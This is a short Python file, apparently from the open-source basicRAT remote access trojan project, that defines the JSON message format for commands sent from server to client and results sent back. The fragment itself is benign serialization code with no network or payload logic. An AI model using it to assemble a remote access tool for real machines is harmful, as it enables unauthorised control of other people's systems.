# -*- coding: utf-8 -*-

#
# basicRAT transport module
# https://github.com/vesche/basicRAT
#

import json


def server_to_client(command, action):
    return {
        'command': command,
        'action': action
    }


def client_to_server(results):
    return {
        'results': results
    }


def dict2json(d):
    return json.dumps(d)


def json2dict(d):
    return json.loads(d)